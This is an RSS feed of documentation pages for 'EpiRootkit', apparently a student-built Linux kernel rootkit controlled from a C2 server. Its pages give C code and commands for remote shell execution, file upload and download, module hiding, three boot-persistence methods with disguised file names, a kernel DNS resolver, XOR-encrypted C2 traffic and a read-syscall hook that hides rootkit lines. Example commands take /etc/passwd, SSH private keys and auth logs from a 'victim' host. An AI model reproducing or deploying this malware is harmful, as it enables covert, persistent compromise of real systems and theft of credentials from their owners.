<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Features on Tux Fan Club Docs</title><link>/docs/05-epirootkit/features/</link><description>Recent content in Features on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 01 Jun 2025 02:02:11 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/features/index.xml" rel="self" type="application/rss+xml"/><item><title>Command Execution</title><link>/docs/05-epirootkit/features/command-execution/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/command-execution/</guid><description>&lt;h1 id="command-execution">Command Execution &lt;a href="#command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Execute shell commands remotely through the rootkit with full output capture.&lt;/p>
&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
&lt;li>&lt;strong>C2 sends command&lt;/strong> via network&lt;/li>
&lt;li>&lt;strong>Rootkit executes&lt;/strong> using &lt;code>call_usermodehelper()&lt;/code> with &lt;code>/bin/sh -c&lt;/code>&lt;/li>
&lt;li>&lt;strong>Captures output&lt;/strong> by redirecting to temporary file&lt;/li>
&lt;li>&lt;strong>Returns result&lt;/strong> with exit code and output&lt;/li>
&lt;/ol>
&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="65d9c8a" class="language-c ">
 &lt;code>static int handle_exec(const char *data)
{
 char *argv[] = { &amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, command_copy, NULL };
 char *envp[] = { &amp;#34;HOME=/&amp;#34;, &amp;#34;PATH=/sbin:/bin:/usr/bin&amp;#34;, NULL };
 
 // Generate unique temporary filename
 snprintf(temp_filename, sizeof(temp_filename), 
 &amp;#34;/tmp/epirootkit_out_%d&amp;#34;, atomic_inc_return(&amp;amp;exec_counter));
 
 // Execute with output redirection
 snprintf(full_command, command_len &amp;#43; temp_len &amp;#43; 32,
 &amp;#34;%s &amp;gt; %s 2&amp;gt;&amp;amp;1&amp;#34;, data, temp_filename);
 
 ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 return send_result(formatted_result);
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="webui-terminal">WebUI Terminal &lt;a href="#webui-terminal" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Interactive terminal interface with:&lt;/p></description></item><item><title>File Transfer</title><link>/docs/05-epirootkit/features/file-transfer/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/file-transfer/</guid><description>&lt;h1 id="file-transfer">File Transfer &lt;a href="#file-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Transfer files between the C2 server and victim system using direct content transmission.&lt;/p>
&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>Upload&lt;/strong>: C2 → Victim system&lt;br>
&lt;strong>Download&lt;/strong>: Victim system → C2&lt;/p>
&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="upload-handler">Upload Handler &lt;a href="#upload-handler" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="e69acbd" class="language-c ">
 &lt;code>static int handle_upload(const char *data)
{
 char *filename, *file_content, *separator;
 struct file *file;
 loff_t pos = 0;
 
 // Parse filename:content format
 separator = strchr(data, &amp;#39;:&amp;#39;);
 *separator = &amp;#39;\0&amp;#39;;
 filename = data;
 file_content = separator &amp;#43; 1;
 
 // Create and write file
 file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
 kernel_write(file, file_content, content_length, &amp;amp;pos);
 filp_close(file, NULL);
 
 return send_success(&amp;#34;File uploaded successfully&amp;#34;);
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="download-handler">Download Handler &lt;a href="#download-handler" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="0590c1d" class="language-c ">
 &lt;code>static int handle_download(const char *data)
{
 struct file *file;
 loff_t file_size, pos = 0;
 char *file_content;
 
 // Open and read file
 file = filp_open(data, O_RDONLY, 0);
 file_size = i_size_read(file_inode(file));
 
 file_content = vmalloc(file_size &amp;#43; 1);
 kernel_read(file, file_content, file_size, &amp;amp;pos);
 filp_close(file, NULL);
 
 return send_result(file_content);
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="webui-interface">WebUI Interface &lt;a href="#webui-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Upload Panel&lt;/strong>: File selection and remote path specification&lt;/li>
&lt;li>&lt;strong>Download Panel&lt;/strong>: File browser and batch downloads&lt;/li>
&lt;/ul>
&lt;h3 id="c2-commands">C2 Commands &lt;a href="#c2-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="c887f91" class="language-bash ">
 &lt;code># Upload files
upload Client-1 ./config.txt /etc/myapp/config.txt
upload Client-1 ./script.sh /tmp/script.sh

# Download files
download Client-1 /etc/passwd ./victim_passwd
download Client-1 /etc/hostname&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="examples">Examples &lt;a href="#examples" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="b5e901e" class="language-bash ">
 &lt;code># System reconnaissance
download Client-1 /etc/passwd
download Client-1 /etc/hosts
download Client-1 /proc/version

# Deploy tools
upload Client-1 ./linpeas.sh /tmp/enum.sh
exec Client-1 chmod &amp;#43;x /tmp/enum.sh

# Exfiltrate data
download Client-1 /home/user/.ssh/id_rsa
download Client-1 /var/log/auth.log&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="technical-details">Technical Details &lt;a href="#technical-details" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
&lt;li>&lt;strong>File size limit&lt;/strong>: 10MB maximum transfer&lt;/li>
&lt;li>&lt;strong>Permissions&lt;/strong>: Files created with 0644 permissions&lt;/li>
&lt;li>&lt;strong>Error handling&lt;/strong>: Graceful failure on permission/space issues&lt;/li>
&lt;/ul></description></item><item><title>Stealth &amp; Hiding</title><link>/docs/05-epirootkit/features/hiding/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/hiding/</guid><description>&lt;h1 id="stealth--hiding">Stealth &amp;amp; Hiding &lt;a href="#stealth--hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Three stealth mechanisms to hide the rootkit from system detection using kernel hooking techniques.&lt;/p>
&lt;h2 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Hide the rootkit module from &lt;code>lsmod&lt;/code> and &lt;code>/proc/modules&lt;/code> by removing it from the kernel&amp;rsquo;s module list.&lt;/p>
&lt;h3 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="7503503" class="language-c ">
 &lt;code>int hide_module(void)
{
 if (stealth_state.module_hidden) return 0;

 stealth_state.prev_module_entry = THIS_MODULE-&amp;gt;list.prev;
 list_del(&amp;amp;THIS_MODULE-&amp;gt;list);
 stealth_state.module_hidden = true;
 return 0;
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;p>&lt;strong>How it works&lt;/strong>: Removes module from kernel&amp;rsquo;s linked list using &lt;code>list_del()&lt;/code>.&lt;/p></description></item><item><title>Persistence</title><link>/docs/05-epirootkit/features/persistence/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/persistence/</guid><description>&lt;h1 id="persistence">Persistence &lt;a href="#persistence" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Multiple boot persistence mechanisms to ensure rootkit survival across system reboots.&lt;/p>
&lt;h2 id="three-mechanisms">Three Mechanisms &lt;a href="#three-mechanisms" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-modules-loadd">1. modules-load.d &lt;a href="#1-modules-loadd" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/modules-load.d/jules_est_bo_system.conf&lt;/code>&lt;br>
&lt;strong>Content&lt;/strong>: &lt;code>epirootkit address=X.X.X.X port=YYYY&lt;/code>&lt;br>
&lt;strong>Trigger&lt;/strong>: systemd reads config and loads module automatically on boot&lt;/p>
&lt;h3 id="2-cron-jobs">2. Cron Jobs &lt;a href="#2-cron-jobs" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/cron.d/jules_est_bo_update&lt;/code>&lt;br>
&lt;strong>Schedule&lt;/strong>: Every 5 minutes check and load if not present&lt;br>
&lt;strong>Stealth&lt;/strong>: Disguised as system update task with stealth naming&lt;/p>
&lt;h3 id="3-shell-profiles">3. Shell Profiles &lt;a href="#3-shell-profiles" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/profile.d/jules_est_bo_env.sh&lt;/code>&lt;br>
&lt;strong>Trigger&lt;/strong>: Executes when root user logs in&lt;br>
&lt;strong>Check&lt;/strong>: Loads module if not already present&lt;/p></description></item><item><title>DNS Resolution</title><link>/docs/05-epirootkit/features/dns-resolution/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/dns-resolution/</guid><description>&lt;h1 id="dns-resolution">DNS Resolution &lt;a href="#dns-resolution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Kernel-space DNS resolver for flexible C2 server connections using domain names.&lt;/p>
&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
&lt;li>&lt;strong>Detect address type&lt;/strong> - IP vs domain name&lt;/li>
&lt;li>&lt;strong>Create UDP socket&lt;/strong> in kernel space&lt;/li>
&lt;li>&lt;strong>Query 8.8.8.8:53&lt;/strong> with A record lookup&lt;/li>
&lt;li>&lt;strong>Parse response&lt;/strong> and extract IPv4 address&lt;/li>
&lt;/ol>
&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="1b9cfde" class="language-c ">
 &lt;code>int kernel_dns_resolve(const char *hostname, u32 *ip_addr)
{
 // Create UDP socket
 sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &amp;amp;sock);
 
 // Build DNS query packet
 dns_query = build_dns_query(hostname);
 
 // Send to 8.8.8.8:53
 kernel_sendmsg(sock, &amp;amp;msg, iov, 1, query_len);
 
 // Receive and parse response
 kernel_recvmsg(sock, &amp;amp;msg, MSG_WAITALL);
 *ip_addr = parse_dns_response(response_buf);
 
 sock_release(sock);
 return 0;
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="domain-name-configuration">Domain Name Configuration &lt;a href="#domain-name-configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="2d6631d" class="language-bash ">
 &lt;code># Use domain name for C2 server
sudo insmod epirootkit.ko address=c2.example.com port=4444&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="ip-address-bypasses-dns">IP Address (bypasses DNS) &lt;a href="#ip-address-bypasses-dns" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="139344d" class="language-bash ">
 &lt;code># Direct IP connection
sudo insmod epirootkit.ko address=192.168.1.100 port=4444&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="integration">Integration &lt;a href="#integration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Automatic detection in socket connection:&lt;/p></description></item><item><title>XOR Encryption</title><link>/docs/05-epirootkit/features/encryption/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/encryption/</guid><description>&lt;h1 id="xor-encryption">XOR Encryption &lt;a href="#xor-encryption" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>XOR encryption for C2 communication with implementation.&lt;/p>
&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
&lt;li>&lt;strong>Symmetric operation&lt;/strong>: Same function for encrypt/decrypt&lt;/li>
&lt;li>&lt;strong>Hardcoded 32-byte key&lt;/strong>: Identical on server and kernel&lt;/li>
&lt;li>&lt;strong>Binary compatibility&lt;/strong>: Consistent synchronization&lt;/li>
&lt;li>&lt;strong>Zero dependencies&lt;/strong>: No crypto API complexities&lt;/li>
&lt;/ul>
&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="server-side">Server Side &lt;a href="#server-side" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="9d4c973" class="language-javascript ">
 &lt;code>// 32-byte hardcoded XOR key
const XOR_KEY = Buffer.from(&amp;#39;0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef&amp;#39;, &amp;#39;hex&amp;#39;);

function xorCrypt(data) {
 const input = Buffer.isBuffer(data) ? data : Buffer.from(data, &amp;#39;utf8&amp;#39;);
 const result = Buffer.alloc(input.length);
 
 for (let i = 0; i &amp;lt; input.length; i&amp;#43;&amp;#43;) {
 result[i] = input[i] ^ XOR_KEY[i % XOR_KEY.length];
 }
 
 return result;
}

const encryption = {
 encrypt(text) { return xorCrypt(text); },
 decrypt(data) { return xorCrypt(data).toString(&amp;#39;utf8&amp;#39;); }
};&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="kernel-side">Kernel Side &lt;a href="#kernel-side" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="26483b9" class="language-c ">
 &lt;code>// Matching XOR key (32 bytes)
static const u8 XOR_KEY[] = {
 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef
};

static void xor_crypt(const u8 *input, u8 *output, size_t length)
{
 for (size_t i = 0; i &amp;lt; length; i&amp;#43;&amp;#43;) {
 output[i] = input[i] ^ XOR_KEY[i % XOR_KEY_SIZE];
 }
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="message-flow">Message Flow &lt;a href="#message-flow" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="2803fd7" class="language- ">
 &lt;code>Plaintext: &amp;#34;CMD:auth:password&amp;#34;
 ↓ XOR with key
Encrypted: [binary data]
 ↓ TCP transmission
Kernel: receives binary → XOR → &amp;#34;CMD:auth:password&amp;#34;&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="compile-time-setting">Compile-time Setting &lt;a href="#compile-time-setting" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="9f42ad7" class="language-c ">
 &lt;code>// rootkit/core/config.h
#define ENABLE_ENCRYPTION 1 // 1 = enabled, 0 = disabled&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="custom-key">Custom Key &lt;a href="#custom-key" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Update both locations with matching values:&lt;/p></description></item><item><title>Line Hiding</title><link>/docs/05-epirootkit/features/line-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/line-hiding/</guid><description>&lt;h1 id="line-hiding">Line Hiding &lt;a href="#line-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide lines containing rootkit patterns from file contents by intercepting read syscalls and filtering output in real-time.&lt;/p>
&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
&lt;li>&lt;strong>Hook &lt;code>ksys_read&lt;/code>&lt;/strong> using kretprobe&lt;/li>
&lt;li>&lt;strong>Check file path&lt;/strong> from file descriptor&lt;/li>
&lt;li>&lt;strong>Filter target files&lt;/strong> line-by-line&lt;/li>
&lt;li>&lt;strong>Remove pattern matches&lt;/strong> and adjust return size&lt;/li>
&lt;/ol>
&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="06fbca6" class="language-c ">
 &lt;code>line_hiding_state.read_probe = (struct kretprobe) {
 .kp.symbol_name = &amp;#34;ksys_read&amp;#34;,
 .handler = read_ret_handler,
 .entry_handler = read_entry_handler,
 .maxactive = 50
};

static int read_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
 if (should_filter_file(ctx-&amp;gt;filepath)) {
 copy_from_user(kernel_buffer, ctx-&amp;gt;user_buffer, ret_value);
 filtered_size = filter_file_lines(kernel_buffer, ret_value);
 copy_to_user(ctx-&amp;gt;user_buffer, kernel_buffer, filtered_size);
 regs_set_return_value(regs, filtered_size);
 }
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="target-configuration">Target Configuration &lt;a href="#target-configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="directories">Directories &lt;a href="#directories" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;code>/etc/cron.d/&lt;/code> - Cron job definitions&lt;/li>
&lt;li>&lt;code>/etc/modules-load.d/&lt;/code> - Module loading configs&lt;/li>
&lt;li>&lt;code>/etc/profile.d/&lt;/code> - Shell profile scripts&lt;/li>
&lt;li>&lt;code>/proc/modules&lt;/code> - Loaded kernel modules&lt;/li>
&lt;/ul>
&lt;h3 id="hidden-patterns">Hidden Patterns &lt;a href="#hidden-patterns" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="5149aee" class="language-c ">
 &lt;code>static const char * const hide_line_patterns[] = {
 &amp;#34;epirootkit&amp;#34;,
 &amp;#34;jules_est_bo_&amp;#34;,
 &amp;#34;EpiRootkit&amp;#34;, 
 &amp;#34;modprobe epirootkit&amp;#34;,
 &amp;#34;insmod epirootkit&amp;#34;
};&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="testing">Testing &lt;a href="#testing" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="test-file">Test File &lt;a href="#test-file" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="02d1263" class="language-bash ">
 &lt;code># Use provided test file
sudo cp test_line_hiding_epirootkit.txt /etc/cron.d/test_epirootkit

# View filtered content
cat /etc/cron.d/test_epirootkit&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;p>&lt;strong>Result&lt;/strong>: 24 lines → ~9 lines (rootkit patterns filtered automatically)&lt;/p></description></item></channel></rss>